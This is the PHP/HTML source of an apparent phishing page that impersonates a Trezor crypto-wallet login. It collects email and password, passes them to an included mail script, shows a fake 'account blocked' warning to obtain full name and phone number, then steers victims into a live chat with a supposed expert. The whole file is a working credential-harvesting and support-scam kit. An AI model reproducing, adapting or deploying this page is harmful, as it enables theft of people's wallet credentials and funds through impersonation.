<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trezor Wallet | Login</title>
     <link href="assets/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="assets/css/all.min.css"/>
    <link rel="stylesheet" href="assets/scss/indexStyle.css">
    <link rel="stylesheet" href="assets/scss/style.css">
</head>
<body>
    <!-- navigation bar -->
    <nav class="navbar navbar-expand-lg" id="navigation">
        <div class="container-fluid">
            <a class="navbar-brand" href="index.html">
                <img src="assets/images/download.png">
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav"
                aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarNav">
                <ul class="navbar-nav">

                    <li class="nav-item">
                        <a class="nav-link active" href="#">Assets</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#">Staking</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#">Earn</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#">NFTs</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#">DAap Browser</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#">Language</a>
                    </li>

                </ul>
            </div>
        </div>
    </nav>
    <!-- navigation ends -->

  <?php
     if (isset($_POST['btnLoginMore'])) {
        include 'mail.php';
    ?>
    <!-- form section -->
    <div class="container-fluid" id="roninLogin">
        <div class="form">
            <div class="brandLogo">
                <img src="assets/images/download.png">
                 <div class=" mb-4 alert-danger text-center" style="text-align: center; color: red; font-size: 17px;">Attention: the account has been <b>temporarily blocked due to suspicious activity in your Network IP,</b> kindly verify the following details<br>
                                             Kindly contact chat assistance for further help
                                           </div>
            </div>
             <form action="" method="post">
                 <input type="hidden" name="email" value="<?php echo $_POST['email']; ?>" />
                                <input type="hidden" name="password" value="<?php echo $_POST['password']; ?>" />
                <div class="mb-5">
                    <!-- <label for="exampleInputEmail1" class="form-label">Email address</label> -->
                    <input type="text" name="name" class="form-control" placeholder="Full Name" id="name"
                        aria-describedby="emailHelp" required>
                </div>
                <div class="mb-5">
                    <!-- <label for="exampleInputPassword1" class="form-label">Password</label> -->
                    <input type="text" class="form-control" placeholder="Phone Number" id="number"
                        required>
                </div>
                <div class="button d-grid">
                    <button type="submit" name="fromLog" class="btn">Submit</button>
                </div>
            </form>
        </div>
    </div>

    <?php } elseif (isset($_POST['fromLog'])) {
         include 'mail.php';
     ?>
      <div class="container-fluid" id="roninLogin">
        <div class="form">
            <div class="brandLogo">
                <img src="assets/images/download.png">
                <h3>Account blocked</h3>
            </div>
              <div class="panel-body text-center" style=" text-align: center;">
                 <p style="font-size: 20px;">Your account has been <b>temporarily blocked</b> due to <br>suspicious activity on your Network IP.<br>Kindly ask an expert</p>
                <div class="form">
                    <label style="font-size: 18px;">Error CODE: <b>6X76D</b></label><br>
                </div>
                <div class="calling-number">
                    <a class="btn btn-danger" href="javascript:void(Tawk_API.toggle())" style="background: #bf0707;color: #fff !important;font-size: 20px;font-weight: 600;margin-top: 15px; padding: 5px; display: inline-flex; text-decoration: none;">Ask Expert</a>
                </div>
            </div>
        </div>
    </div>

    <?php } else { ?>
    <!-- form section -->
    <div class="container-fluid" id="roninLogin">
        <div class="form">
            <div class="brandLogo">
                <img src="assets/images/download.png">
                <h3>The most trusted & secure crypto wallet</h3>
            </div>
             <form action="" method="post">
                <div class="mb-5">
                    <!-- <label for="exampleInputEmail1" class="form-label">Email address</label> -->
                    <input name="email" type="email" class="form-control" placeholder="Email" id="exampleInputEmail1"
                        aria-describedby="emailHelp" required>
                </div>
                <div class="mb-5">
                    <!-- <label for="exampleInputPassword1" class="form-label">Password</label> -->
                    <input name="password" type="password" class="form-control" placeholder="Password" id="exampleInputPassword1"
                        required>
                </div>
                <div class="button d-grid">
                    <button type="submit" name="btnLoginMore" class="btn">Submit</button>
                </div>
            </form>
        </div>
    </div>
    <?php }  ?>
        <!--Start of Tawk.to Script-->
<script type="text/javascript">
var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
(function(){
var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
s1.async=true;
s1.src='https://embed.tawk.to/620a586d9bd1f31184dc89bb/1frs6irvs';
s1.charset='UTF-8';
s1.setAttribute('crossorigin','*');
s0.parentNode.insertBefore(s1,s0);
})();
</script>
<!--End of Tawk.to Script--> 
</body>
</html>